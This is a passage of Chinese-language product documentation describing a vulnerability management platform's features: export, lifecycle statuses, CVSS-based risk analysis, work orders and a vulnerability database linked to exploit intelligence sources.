title="漏洞导出："></a>漏洞导出：</h4><p>用户可以选择导出列表中选中的漏洞或全部漏洞为Excel文件，以便进行进一步的分析和报告。</p><p>平台支持对列表中选中的漏洞或全部漏洞进行导出，生成Excel文件的功能。</p><p>用户可以根据需要，在漏洞列表中选择特定的漏洞或勾选全部漏洞，然后通过平台提供的导出功能，将选中的漏洞信息导出为Excel文件。这样的操作允许用户将所需的漏洞信息导出到Excel表格中，便于进行进一步的分析、备份或共享。</p><p>导出的Excel文件将包含选中漏洞的详细信息，例如漏洞名称、资产信息、发现时间、状态、等级等相关数据。这种导出功能使用户能够更加灵活地利用漏洞信息，并便于在本地进行处理、整理或共享，有助于对漏洞信息进行更全面、深入的分析和管理。</p><h4 id="漏洞分析信息："><a href="#漏洞分析信息：" class="headerlink" title="漏洞分析信息："></a>漏洞分析信息：</h4><p>平台支持展示漏洞分析信息，包括漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等详细内容，以帮助用户全面了解漏洞的背景和影响。</p><p>漏洞原因： 平台提供漏洞分析信息，详细描述漏洞产生的原因。这包括对漏洞背后的技术原理、系统缺陷或程序逻辑问题的解释，有助于用户更全面地理解漏洞产生的根本原因。</p><p>漏洞相关项及零部件信息： 平台展示与漏洞相关的其他项目或零部件信息，可能涉及的软硬件组件、版本信息、依赖项等内容。这种信息有助于用户全面了解漏洞的影响范围和关联项，有助于更全面地定位和解决漏洞。</p><p>责任内部归口部门： 平台能够指明漏洞解决的内部归口部门，即哪个部门或团队负责解决该漏洞。这种信息有助于有效分工和协作，确保漏洞能够得到及时且有效地解决。</p><h4 id="多视角多维度漏洞管理（网络资产、移动APP）"><a href="#多视角多维度漏洞管理（网络资产、移动APP）" class="headerlink" title="多视角多维度漏洞管理（网络资产、移动APP）"></a>多视角多维度漏洞管理（网络资产、移动APP）</h4><p>支持IP视角和网站资产视角的漏洞管理和分析，用户可以查看漏洞数量、漏洞名称、漏洞级别、漏洞类型、CWE编号、CVE编号、POC方式、采集途径、WEB应用等不同维度的漏洞信息。</p><p>漏洞名称：提供漏洞的具体名称，有助于用户快速识别和了解漏洞的特征。</p><p>漏洞级别：展示漏洞的严重程度或危害级别，帮助用户评估漏洞的优先处理程度。</p><p>漏洞类型：包括诸如网络漏洞、应用程序漏洞、系统漏洞等分类，帮助用户了解漏洞的性质和类型。</p><p>CWE编号和CVE编号： 提供漏洞对应的CWE（常见弱点枚举）编号和CVE（通用漏洞披露）编号，有助于对漏洞进行更准确的标识和追踪。</p><p>POC方式：提供关于漏洞利用或验证的POC（证明概念）方式，有助于用户更全面地了解漏洞的利用方式和影响。</p><p>采集途径：指明漏洞信息的来源或采集方式，包括扫描器、靶场、安全测试等，帮助用户了解漏洞信息的收集来源。</p><p>支持移动APP的多视角管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度。</p><p>漏洞影响URL：提供漏洞影响的URL或相关链接，有助于识别和定位漏洞影响的具体网络资源。</p><p>漏洞名称：显示漏洞的名称或描述，帮助用户迅速理解漏洞的特征和影响。</p><p>漏洞级别：展示漏洞的严重程度或风险级别，帮助用户判断漏洞对移动应用安全性的威胁程度。</p><p>漏洞类型：包括诸如认证漏洞、数据泄露、权限问题等移动应用漏洞的分类，有助于用户了解漏洞的性质和类型。</p><p>移动版本号：显示移动应用程序的版本信息，有助于用户了解哪些版本受到了漏洞影响或哪些版本已经修复了该漏洞。</p><p>产品功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9a9d60bcdad3bd76f67907f2d920d0ea.png"></p><h4 id="漏洞全生命周期管理："><a href="#漏洞全生命周期管理：" class="headerlink" title="漏洞全生命周期管理："></a>漏洞全生命周期管理：</h4><p>提供漏洞全生命周期管理模型，满足不同的风险控制措施和力度的管理需求。</p><p>漏洞全生命周期管理模型旨在实现漏洞管理的全面覆盖。该模型涵盖了漏洞的完整生命周期，从漏洞发现到解决，再到最终的验证和报告。在此过程中，系统支持多种来源的漏洞信息收集，涵盖了不同的发现途径和严重性评估。处理阶段包括漏洞解决方案的制定和执行，以及对处理过程的跟踪和记录。此外，漏洞的有效验证和最终的报告也是该模型中的重要环节。这个模型有助于系统管理员和安全团队全面了解、处理和解决各类漏洞，以最大程度地减少系统面临的安全风险。</p><h4 id="多维度展现车辆漏洞信息："><a href="#多维度展现车辆漏洞信息：" class="headerlink" title="多维度展现车辆漏洞信息："></a>多维度展现车辆漏洞信息：</h4><p>我方的车辆漏洞信息展示支持多维度展示，包括了：漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度。</p><p>漏洞列表： 显示所有漏洞信息，包括漏洞名称、漏洞级别、关联零部件、相关车型等。</p><p>车型关联信息： 列出同一漏洞可能存在的相关车型列表，以便用户了解其他受影响的车辆。</p><p>产品截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a49e7d5f873e47d3f45e3fdf8b582bc2.png" alt="企业微信截图_17035233441771"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25843cd36e81baf6fa39faa0e787c405.png" alt="企业微信截图_17035233505561"></p><h4 id="漏洞优先级排序："><a href="#漏洞优先级排序：" class="headerlink" title="漏洞优先级排序："></a>漏洞优先级排序：</h4><p>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序，确保高风险漏洞得到优先处理。</p><p>对于漏洞优先级排序模型，系统支持将漏洞与利用情报和网关防御规则自动关联，以确保高风险漏洞得到优先处理。</p><p>该排序模型结合了多方面的信息，包括漏洞的严重性评估、已知的利用情报和网关防御规则。系统可以自动分析漏洞的严重性、已知的攻击利用情报、以及可能的防御规则，并根据这些信息为漏洞赋予相应的优先级。</p><p>通过这种模型，高风险漏洞将会被自动识别和标记为优先处理的对象。利用已知的攻击情报和网关防御规则，系统可以及时辨识和定位可能被利用的漏洞，确保在安全风险最高的情况下，系统管理员能够优先处理这些漏洞。</p><p>这个排序模型的主要目标是使安全团队能够更有效地分配资源，首先处理可能造成最严重后果的漏洞，从而最大程度地减少系统面临的潜在风险。</p><p>产品功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/518255438adf9795fb071c03dbb8b8bf.png" alt="734467720a3816708dd3bd51da50529"></p><h4 id="丰富的漏洞状态："><a href="#丰富的漏洞状态：" class="headerlink" title="丰富的漏洞状态："></a>丰富的漏洞状态：</h4><p>我方有丰富的漏洞状态，这些状态可以帮助团队跟踪漏洞处理的不同阶段，确保每个漏洞都得到适当的处理和跟进。具体状态如下：</p><p>新增：漏洞被最初发现并报告，但尚未经过验证或分配给相应的团队或个人处理。</p><p>开放：漏洞已被确认并分配给负责团队，但尚未进行进一步的处理或验证。</p><p>重现：团队已经能够重现漏洞，即在特定条件下能够复现该问题。</p><p>误报：最初被报告为漏洞的问题实际上不是漏洞，可能是由于误解或其他原因而被错误地报告。</p><p>忽略：经过评估后，决定该漏洞并不会带来实际影响或风险，因此选择不予处理。</p><p>接受：确认该漏洞存在，并被接受为需要解决的问题。</p><p>缓解：已经实施了临时性的修复或措施，以减轻漏洞可能带来的影响。</p><p>消除：成功修复了漏洞，并且相应的系统或软件不再受其影响。</p><p>待修复：漏洞已被确认，但尚未进行修复操作。</p><p>修复完成：漏洞已成功修复并验证完毕。</p><p>无法修复：经过评估后认定无法直接修复该漏洞或问题。</p><p>超期未修复：设定的修复期限已过，但漏洞仍未得到处理或修复。</p><p>待验证：修复措施已经实施，但尚未进行验证以确认修复是否有效。</p><p>验证成功：经过验证确认，修复措施已成功解决漏洞。</p><p>验证失败：修复措施被验证后发现并未解决漏洞。</p><p>待复测：修复措施已经重新实施，但尚未进行再次验证。</p><p>复测通过：经过再次验证，确认修复措施已经有效。</p><p>复测失败：再次验证后发现修复措施仍然未能解决漏洞。</p><p>待处理：漏洞被发现，但尚未进行任何处理或分类。</p><h4 id="漏洞时间线管理："><a href="#漏洞时间线管理：" class="headerlink" title="漏洞时间线管理："></a>漏洞时间线管理：</h4><p>支持漏洞时间线管理，包括漏洞公布时间、不同来源POC公布时间、Snort IPS规则公布时间、资产发现时间、漏洞发现时间、漏洞生命周期状态的跟踪，以提炼考核指标。产品功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/518255438adf9795fb071c03dbb8b8bf.png" alt="734467720a3816708dd3bd51da50529"></p><h3 id="漏洞风险管理"><a href="#漏洞风险管理" class="headerlink" title="漏洞风险管理"></a>漏洞风险管理</h3><p>漏洞风险管理模块为漏洞管理平台提供了重要的风险评估和分析功能。它支持漏洞的CVSS评分，包括多个维度如攻击向量、攻击复杂度、权限要求、用户交互、影响范围、机密性、完整性和可用性等。这有助于全面了解漏洞的风险程度。</p><p>漏洞风险管理模块提供了风险分析功能，用户可以自动或人工对漏洞进行详细分析。分析内容包括攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害和影响、影响等级、风险等级以及修复时限要求等。通过这些分析，用户可以更好地理解漏洞对系统的潜在威胁，帮助组织制定相应的风险控制和漏洞修复策略，确保系统的安全性和可靠性。这一模块的功能完善了漏洞管理平台的风险管理能力，有助于更好地识别和处理高风险漏洞。</p><p>功能参数如下：</p><ul><li>支持漏洞CVSS评分，评分内容涉及攻击向量、攻击复杂度、权限要求、用户交互、影响范围、机密性、完整性、可用性。</li><li>支持对漏洞进行风险分析功能，可支持自动和人工处分析内容包括攻击路径及路径编号、攻击可行性等级、漏洞可能做成的危害及影响、影响等级、风险等级及修复时限要求。</li><li>支持漏洞风险评估报表，可根据漏洞重要性对漏洞修复的优先级进行排序，报表内容漏洞信息展示，不限于漏洞风险等级、漏洞信息、漏洞关联资产。</li></ul><h4 id="漏洞CVSS评分："><a href="#漏洞CVSS评分：" class="headerlink" title="漏洞CVSS评分："></a>漏洞CVSS评分：</h4><p>平台支持对漏洞进行CVSS评分，该评分包括多个方面，如攻击向量、攻击复杂度、权限要求、用户交互、影响范围、机密性、完整性和可用性等。这有助于明确漏洞的严重程度。</p><p>攻击向量（Attack Vector）： 用于评估攻击者是否可以远程或本地利用漏洞。这个指标表示攻击者进入和接近目标的方式。</p><p>攻击复杂度（Attack Complexity）： 用于评估利用漏洞的复杂程度。这个指标考虑攻击者利用漏洞所需的条件，例如特定环境、特定配置或特定用户交互等。</p><p>权限要求（Privileges Required）： 衡量攻击者利用漏洞所需的权限级别，从不需要特殊权限到需要完全控制系统等级别。</p><p>用户交互（User Interaction）： 评估攻击者利用漏洞所需的用户参与程度，例如是否需要用户交互行为才能利用漏洞。</p><p>影响范围（Scope）： 评估成功利用漏洞后对其他系统、组件或资源的影响程度。</p><p>机密性（Confidentiality）： 衡量成功利用漏洞对数据机密性的影响程度。</p><p>完整性（Integrity）： 评估成功利用漏洞对数据完整性的影响程度。</p><p>可用性（Availability）： 衡量成功利用漏洞对系统或资源可用性的影响程度。</p><h4 id="风险分析功能："><a href="#风险分析功能：" class="headerlink" title="风险分析功能："></a>风险分析功能：</h4><p>平台提供风险分析功能，可以自动或人工分析漏洞的风险。分析内容包括攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害和影响、影响等级、风险等级以及修复时限要求。这有助于用户更好地理解漏洞可能带来的威胁。</p><p>平台提供漏洞风险评估报表，可根据漏洞重要性对漏洞修复的优先级进行排序，报表内容漏洞信息展示，不限于漏洞风险等级、漏洞信息、漏洞关联资产。</p><p>风险分析功能。这项功能涵盖了攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害及影响、影响等级、风险等级以及修复时限要求等内容。这样的分析有助于全面评估漏洞可能性和影响，并根据风险等级确定漏洞修复的紧急性，确保系统安全性和稳定性。</p><p>漏洞风险评估报表能够根据漏洞的重要性对修复优先级进行排序。报表内容主要包括漏洞信息展示，其中包括但不限于漏洞风险等级、漏洞信息和漏洞关联资产等要素。</p><p>这份报表可以清晰地展示各个漏洞的风险评级，帮助管理员和安全团队根据漏洞的重要性和对系统的潜在威胁程度进行优先级排序。同时，报表内容会呈现漏洞的详细信息，包括其影响程度、相关资产以及可能产生的潜在危害，为漏洞修复提供全面参考依据。</p><p>这种漏洞风险评估报表的生成，为安全团队提供了清晰的视图，帮助他们有效地确定漏洞修复的优先级，以及采取相应的安全措施来保障系统的安全性。</p><h3 id="工单管理"><a href="#工单管理" class="headerlink" title="工单管理"></a>工单管理</h3><p>工单管理模块为漏洞管理平台提供了全面的工作流程和任务协调功能。用户可以创建不同类型的工单，包括验证漏洞工单、修复漏洞工单、复测漏洞工单以及人工渗透工单。这些工单类型允许用户验证漏洞修复措施，进行漏洞修复预验证以及实施效果验证等操作。</p><p>工单管理还支持工单的审核，包括审核状态的管理，如未审核、待审核、审核通过和审核不通过。用户可以根据工单状态进行操作，包括待派单、待接单、已拒单、进行中、已完成和已关闭。</p><p>工单可以进行多种操作，如派单、接单、转单、拒单、申请延期、删除等。工单内容中的漏洞数据可根据数据权限进行判断，以确保信息的安全性。</p><p>工单管理模块还支持与现有工单系统的联动，以实现协同处理。此外，用户可以通过站内消息推送和邮件推送进行多角色、多用户之间的实时沟通和协作。</p><p>可以导出漏洞数据，包括全部资产的漏洞数据、条件搜索后的漏洞数据以及指定勾选的漏洞数据。用户可以自定义配置要导出的漏洞属性，并对导出的漏洞属性进行排序。还可以生成工单信息的报告，支持自定义报告模板，包括自定义logo、单位名称、页眉和页脚信息，以及对报告中的漏洞级别、数量、情报来源等进行过滤和筛选。</p><p>报告可以导出为Word和PDF格式，方便用户进行分享和归档。</p><p>功能参数如下：</p><ul><li>支持创建不同类型的工单，工单类型分为：验证漏洞工单、修复漏洞工单、复测漏洞工单、人工渗透工单。可对漏洞修复措施进行验证，同时支持漏洞修复预验证和实施效果验证措施等。</li><li>支持对工单进行审核，工单审核状态分为：未审核、待审核、审核通过、审核不通过。</li><li>支持自动和手动对工单状态修改，工单状态分为：待派单、待接单、已拒单、进行中、已完成、已关闭。</li><li>工单可进行派单、接单、转单、拒单、申请延期、删除等操作。</li><li>工单内容中单漏洞可根据数据权限判断，避免信息泄露。</li><li>在上传漏洞数据文件时，可直接把漏洞加入工单。</li><li>支持与现有工单系统联动，进行协同处理。</li><li>支持系统内部多角色、多用户之间的站内消息推送、邮件推送。</li><li>支持对全部资产的漏洞数据、条件搜索后的漏洞数据、指定勾选的漏洞数据进行导出。</li><li>支持自定义配置要导出的漏洞属性。</li><li>支持对导出的漏洞属性进行排序。</li><li>内置报告模版，支持对报告模版的logo、单位名称、页眉页脚信息进行自定义。</li><li>支持对报告中的漏洞级别、数量、情报来源等进行过滤筛选。</li><li>支持word、PDF格式导出工单信息。</li></ul><h4 id="多类型工单管理："><a href="#多类型工单管理：" class="headerlink" title="多类型工单管理："></a>多类型工单管理：</h4><p>支持创建不同类型的工单，包括验证漏洞工单、修复漏洞工单、复测漏洞工单、人工渗透工单。可对漏洞修复措施进行验证，同时支持漏洞修复预验证和实施效果验证措施等。这有助于明确每个工单的目的和流程。</p><p>系统支持创建多种工单类型，分别包括验证漏洞工单、修复漏洞工单、复测漏洞工单以及人工渗透工单。这些工单针对漏洞管理过程中的不同阶段，允许对漏洞修复措施进行验证。验证漏洞工单用于确认漏洞的存在与否，修复漏洞工单用于跟踪和管理漏洞修复进程，复测漏洞工单用于再次测试修复效果，而人工渗透工单则用于安排和记录人工渗透测试的过程。</p><p>这些工单类型支持对漏洞修复措施的验证。系统可以进行漏洞修复前的预验证，确保计划的修复方案有效。此外，系统还能提供修复效果验证措施，以确认漏洞修复方案的实际效果和系统安全性的提升。</p><p>这种多类型工单管理系统有助于安全团队规划和追踪漏洞修复过程，确保漏洞得到有效处理，系统安全性得到提升。</p><h4 id="工单审核："><a href="#工单审核：" class="headerlink" title="工单审核："></a>工单审核：</h4><p>提供工单审核功能，工单状态包括未审核、待审核、审核通过和审核不通过。这确保了每个工单都经过必要的审查和批准。</p><p>系统支持工单的审核过程，其中包含四种状态：未审核、待审核、审核通过和审核不通过。</p><p>未审核状态表示工单尚未经过审核；待审核状态表示工单已提交但还未被审核人员处理；审核通过状态表示工单已通过审核并可进入下一步流程；审核不通过状态表示工单未能通过审核，可能需要进行修改后重新提交。</p><h4 id="工单状态管理："><a href="#工单状态管理：" class="headerlink" title="工单状态管理："></a>工单状态管理：</h4><p>工单可以根据进展的情况自动或手动修改状态。状态包括待派单、待接单、已拒单、进行中、已完成和已关闭，以确保工单跟踪。</p><p>系统支持工单状态的自动和手动修改，包括以下状态：待派单、待接单、已拒单、进行中、已完成和已关闭。</p><p>待派单状态表示工单已创建但尚未被分配或派发给具体处理人员。</p><p>待接单状态指工单已派发给处理人员，等待其接受任务。</p><p>已拒单状态表示处理人员拒绝接受该工单任务。</p><p>进行中状态表示工单正在被处理人员处理中。</p><p>已完成状态表示工单任务已被处理人员完成。</p><p>已关闭状态表示工单处理流程结束，已不再需要进一步处理或跟进。</p><h4 id="工单操作："><a href="#工单操作：" class="headerlink" title="工单操作："></a>工单操作：</h4><p>支持多种工单操作，包括派单、接单、转单、拒单、申请延期、删除等，以便及时处理漏洞和工单。</p><p>派单：指将工单指派给相应的处理人员或团队，让其负责处理任务。</p><p>接单：处理人员或团队接受任务并开始执行相关操作。</p><p>转单：将工单从一个处理人员或团队转移给另一个人员或团队，通常是由于需要更适合的人员来处理。</p><p>拒单：指处理人员或团队拒绝接受任务，可能是由于资源不足或无法处理的原因。</p><p>申请延期：处理人员或团队申请将工单的完成时间推迟至更晚的时间点。</p><p>删除：删除不再需要处理或已经完成的工单。</p><h4 id="权限控制："><a href="#权限控制：" class="headerlink" title="权限控制："></a>权限控制：</h4><p>工单内容中的漏洞可以根据用户的数据权限进行判断，以确保敏感信息的保密性，避免信息泄露。</p><p>数据权限控制能够确保只有获得相应权限的用户或角色能够查看或处理特定漏洞的详细信息。系统会根据用户或角色的权限设置，在工单内容中对单个漏洞的显示进行限制，以保护敏感信息不被未经授权的人员查看或获取。</p><p>这种数据权限控制机制有助于防止敏感信息泄露，保护漏洞等重要安全数据的安全性和保密性，同时确保合适的人员能够获得必要的信息进行工单处理。</p><h4 id="漏洞数据集成："><a href="#漏洞数据集成：" class="headerlink" title="漏洞数据集成："></a>漏洞数据集成：</h4><p>允许在上传漏洞数据文件时，将漏洞直接加入工单，简化了漏洞处理过程。</p><p>协同处理：支持与现有工单系统的联动，以协同处理和跟踪漏洞的解决。</p><p>这种功能使得用户能够直接通过上传漏洞数据文件的方式将漏洞信息快速添加到工单中。系统可以自动识别和解析上传的文件，将其中的漏洞信息提取出来，并根据用户需求，将这些漏洞信息直接关联到相应的工单中，为后续的处理和跟进提供更为便捷的方式。</p><p>这样的操作简化了漏洞信息加入工单的流程，提高了工作效率，让用户能够更加快速地处理和管理相关漏洞。</p><h4 id="消息通知："><a href="#消息通知：" class="headerlink" title="消息通知："></a>消息通知：</h4><p>提供系统内部多角色和多用户之间的站内消息推送和邮件推送，以确保及时的通信和协作。</p><p>通过站内消息推送，不同角色和用户能够在系统内部进行消息沟通、交流和通知，无需依赖外部通讯工具。这种消息推送可以提高内部沟通的效率和便捷性，让团队成员更方便地分享信息、讨论问题和协同工作。</p><p>同时，系统支持邮件推送功能，能够通过电子邮件向不同用户发送相关通知、提醒或重要信息。邮件推送是一种可靠的通知方式，使用户能够及时了解到重要的系统更新、任务通知或其他相关信息。</p><p>这两种推送方式的结合，能够满足用户在系统内外进行即时、有效的信息沟通和交流的需求。</p><h4 id="导出功能："><a href="#导出功能：" class="headerlink" title="导出功能："></a>导出功能：</h4><p>可以导出所有资产的漏洞数据，根据条件搜索后的漏洞数据，或者指定勾选的漏洞数据，并且对导出的漏洞属性可以进行排序以满足不同的报告需求。</p><p>用户可以根据需求选择导出全部资产的漏洞数据，或者根据条件搜索后得到的结果进行导出，也可以勾选特定的漏洞数据进行导出。这种灵活的导出功能允许用户将漏洞数据以可下载的格式导出，例如Excel或CSV文件，以便于进一步分析、备份或与其他系统进行数据交互。</p><p>这种导出功能提供了灵活性和便利性，让用户能够根据具体需求获取特定范围的漏洞数据，进一步利用这些数据做进一步的分析和管理。</p><h4 id="自定义配置："><a href="#自定义配置：" class="headerlink" title="自定义配置："></a>自定义配置：</h4><p>提供自定义配置选项，允许用户选择要导出的漏洞属性，并支持对导出的漏洞属性进行排序，以满足个性化的需求。</p><p>这项功能允许用户根据需要自定义选择要在导出文件中包含的漏洞属性。用户可以根据具体的需求，选择性地包括漏洞编号、漏洞描述、漏洞等级 等属性信息，并将这些属性列入导出文件中。</p><p>这种自定义配置功能提供了灵活性，让用户根据自己的工作流程和需求，定制导出文件中包含的漏洞属性，使得导出数据更符合用户的管理和分析需求。</p><h4 id="报告模板："><a href="#报告模板：" class="headerlink" title="报告模板："></a>报告模板：</h4><p>内置报告模板，允许对报告模板的logo、单位名称、页眉页脚信息进行自定义，以生成符合要求的工单报告。</p><p>用户能够根据实际需要，对报告模板进行个性化定制。用户可以自行上传公司或组织的logo图标，设置单位名称，以及编辑页眉和页脚等内容，以确保生成的报告符合公司的品牌形象和标准格式要求。</p><p>这种自定义功能使用户能够创建符合自身需求和品牌标识的报告模板，从而提升报告的专业性和个性化水平。</p><h4 id="漏洞过滤："><a href="#漏洞过滤：" class="headerlink" title="漏洞过滤："></a>漏洞过滤：</h4><p>支持对报告中的漏洞级别、数量、情报来源等进行过滤筛选，以便更好地理解漏洞情况。</p><p>导出格式：</p><p>支持将工单信息导出为Word和PDF格式，以满足不同报告和沟通的需求。</p><p>用户可以根据需求，在生成报告之前设置筛选条件，例如按照特定漏洞级别（如高、中、低）等进行过滤。这样的操作能够让用户生成满足特定条件的报告，筛选展示符合用户关注或需求的漏洞信息。</p><p>这种过滤筛选功能有助于用户根据具体需求，生成精准、专业的报告，从而更有效地传达漏洞信息及安全状况，帮助用户做出更明智的安全决策。</p><h3 id="构建漏洞库"><a href="#构建漏洞库" class="headerlink" title="构建漏洞库"></a>构建漏洞库</h3><p>构建漏洞库模块为漏洞管理平台提供了强大的漏洞数据管理和分析能力。通过统计分析引擎、关联分析引擎、知识提取引擎和任务调度引擎，可以从底层的漏洞数据安全运营平台获取漏洞共享与分析的数据。</p><p>漏洞库支持多方面的漏洞数据管理，包括漏洞提报、研判、认定和处置等能力。它专注于不同领域的漏洞，如车辆零部件、无线电、APP、云端平台等，实现了漏洞的持续归档和长期留存。</p><p>漏洞库可兼容多个漏洞库，如CVE、CNNVD、CNVD等，以确保漏洞库的全面覆盖。漏洞信息可以整合为一条，提高了数据的可读性和维护效率。</p><p>漏洞库整合了漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，漏洞情报条目数量庞大。漏洞库支持与利用情报的自动关联分析，提供了丰富的关联情报数据。</p><p>漏洞库支持漏洞的自动导出功能，导出信息包括漏洞关联资产信息（包括零部件名称、型号、版本）、漏洞版本、危害和影响等重要信息。</p><p>功能参数如下：</p><ul><li>支持通过统计分析引擎、关联分析引擎、知识提取引擎和任务调度引擎，从底层漏洞数据安全运营平台提供漏洞共享与分析；</li><li>支持提供漏洞提报、研判、认定和处置等管理能力，针对车辆零部件、无线电、APP、云端平台等方面的漏洞库，实现漏洞持续化归档以及漏洞数据长期留存；</li><li>支持兼容CVE、CNNVD、CNVD等漏洞库，保证漏洞库的全面覆盖；</li><li>支持对漏洞信息CVE、CNNVD、CNVD条目整合为一条；</li><li>支持漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，漏洞情报条目大于14万条；</li><li>漏洞库支持与利用情报自动关联分析，漏洞库关联情报数为32%，即在14万漏洞库条目中有，有35%的漏洞是关联情报的；</li><li>支持漏洞自动导出功能，导出信息包括漏洞关联资产信息（包括零部件名称、型号、版本）、漏洞版本、危害及及影响等信息。</li><li>支持对接第三方漏洞库（CNVD、CNNVD）数据，支持在线更新和离线更新方式，更新频率可自动设置按周、月等，重大漏洞信息及时更新；</li><li>允许对漏洞条目进行用户自定义编辑，用户可对漏洞名称、等级、类型、漏洞描述、漏洞修复建议、CVSS向量和风险值、参考信息进行修改和完善。</li></ul><h4 id="数据源与引擎："><a href="#数据源与引擎：" class="headerlink" title="数据源与引擎："></a>数据源与引擎：</h4><p>支持通过统计分析引擎、关联分析引擎、知识提取引擎和任务调度引擎，从底层漏洞数据安全运营平台共享漏洞数据，以便进一步的分析和处理。</p><p>这些引擎功能能够从漏洞数据安全运营平台中提取数据，并进行统计分析、关联分析等操作，以提供漏洞共享和深度分析的能力。通过这些引擎，系统能够对漏洞数据进行有效整合、分析和挖掘，从而生成有价值的信息用于安全决策和风险评估。</p><p>这种功能能够帮助安全团队更好地利用漏洞数据，从底层平台提取相关信息并进行多维度分析，以提高安全性和降低风险。</p><h4 id="漏洞信息管理："><a href="#漏洞信息管理：" class="headerlink" title="漏洞信息管理："></a>漏洞信息管理：</h4><p>提供漏洞的提报、研判、认定和处置等管理能力，可针对不同方面的漏洞库，如车辆零部件、无线电、APP、云端平台等，实现漏洞的持续归档和长期留存。</p><p>系统支持提供漏洞提报、研判、认定和处置等管理功能，针对车辆零部件、无线电等方面。用户能够通过系统快捷地获取与车型和车辆态势相关的资产信息。这包括特定车型或车辆的状态、运行情况、相关风险等重要资产信息的直观展示和查看。</p><h4 id="漏洞库兼容性："><a href="#漏洞库兼容性：" class="headerlink" title="漏洞库兼容性："></a>漏洞库兼容性：</h4><p>支持与通用漏洞标识符（CVE）、国家信息安全漏洞共享平台（CNNVD）、中国国家信息安全漏洞库（CNVD）等漏洞库兼容，以确保漏洞库的全面覆盖。</p><p>系统支持兼容CVE、CNNVD、CNVD等漏洞库，确保漏洞库信息的全面覆盖。这意味着用户可以依赖系统与广泛使用的漏洞库进行对接，获取及时的漏洞信息，为车辆零部件和无线电等方面的漏洞管理提供全面的支持和依据。</p><h4 id="漏洞信息整合："><a href="#漏洞信息整合：" class="headerlink" title="漏洞信息整合："></a>漏洞信息整合：</h4><p>支持将漏洞信息从不同漏洞库来源整合为一条，以提供更清晰和一致的漏洞信息。</p><p>整合功能允许系统将同一漏洞在不同漏洞数据库中的标识符（如CVE、CNNVD、CNVD等）整合为一条信息进行展示。这样的操作能够帮助用户更清晰地查看并理解特定漏洞的多个来源信息，使漏洞信息更加简洁和易于管理。</p><p>通过整合不同来源的漏洞信息，系统能够提供更为全面和一致的视图，方便用户快速了解特定漏洞的相关内容和风险程度，有助于更高效地进行安全漏洞管理和处置。</p><h4 id="漏洞利用情报："><a href="#漏洞利用情报：" class="headerlink" title="漏洞利用情报："></a>漏洞利用情报：</h4><p>提供漏洞利用情报，情报来源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，漏洞情报条目数量超过14万条。</p><p>系统整合了来自多个权威渠道的漏洞利用情报，提供了庞大且多样化的漏洞信息库。这些信息涵盖了各种漏洞的详细情报，包括漏洞利用脚本、攻击模块、安全漏洞描述等内容，漏洞情报条目数量超过14万条。用户可以从这些权威来源获取有关漏洞利用的详尽信息，用于分析安全威胁、评估风险，并采取相应的安全防护措施。</p><p>这种功能的支持有助于提高对漏洞利用情报的获取和利用，帮助安全团队更好地了解威胁情报，加强系统的安全防御能力。</p><h4 id="漏洞库关联分析："><a href="#漏洞库关联分析：" class="headerlink" title="漏洞库关联分析："></a>漏洞库关联分析：</h4><p>漏洞库支持与利用情报自动关联分析，确保至少有32%的漏洞与关联情报相关联，即在14万漏洞库条目中有，有35%的漏洞是关联情报的，以提供更全面的漏洞信息。</p><p>关联分析能力允许系统自动检测并关联与漏洞库中漏洞相关的利用情报来源，从而为用户提供更为全面和有针对性的漏洞信息。这些关联的情报可以包括已知的攻击模块、利用脚本、漏洞利用工具等方面的信息，帮助用户更深入地理解漏洞的危害性和风险等级。</p><p>这种自动关联分析功能有助于提高漏洞库的价值和实用性，帮助用户更快速地识别并处理相关漏洞，从而提升系统的安全性。</p><h4 id="漏洞自动导出："><a href="#漏洞自动导出：" class="headerlink" title="漏洞自动导出："></a>漏洞自动导出：</h4><p>支持自动导出漏洞信息，导出的信息包括漏洞关联资产信息（包括零部件名称、型号、版本）、漏洞版本、危害和影响等关键信息。</p><p>用户可以自动导出与漏洞相关联的资产信息，包括零部件的具体名称、版本等细节，以及漏洞的版本信息、危害程度和影响范围等关键信息。导出的数据可以进一步用于分析和评估漏洞的风险，并指导相应的安全措施和修复计划。</p><p>这种自动导出功能能够帮助用户更高效地整理和利用漏洞关联的资产信息，为安全团队提供全面的视图，以便更好地管理漏洞和采取相应的安全措施。</p><h4 id="对接第三方平台："><a href="#对接第三方平台：" class="headerlink" title="对接第三方平台："></a>对接第三方平台：</h4><p>支持对接第三方漏洞库（CNVD、CNNVD）数据，支持在线更新和离线更新方式，更新频率可自定义，可自动设置按周、月等，重大漏洞信息及时更新。</p><p>系统可以与第三方漏洞库进行连接，并根据用户设定的时间表自动更新数据。系统能够获取最新的漏洞信息，包括重大漏洞的及时更新，保持数据的准确性和完整性。</p><p>这种对接和更新功能有助于系统保持漏洞信息的更新和完整性，帮助用户及时了解到最新的重大漏洞信息，为安全团队提供必要的信息支持，以便及时采取相应的安全措施。</p><h4 id="对漏洞条目自定义编辑："><a href="#对漏洞条目自定义编辑：" class="headerlink" 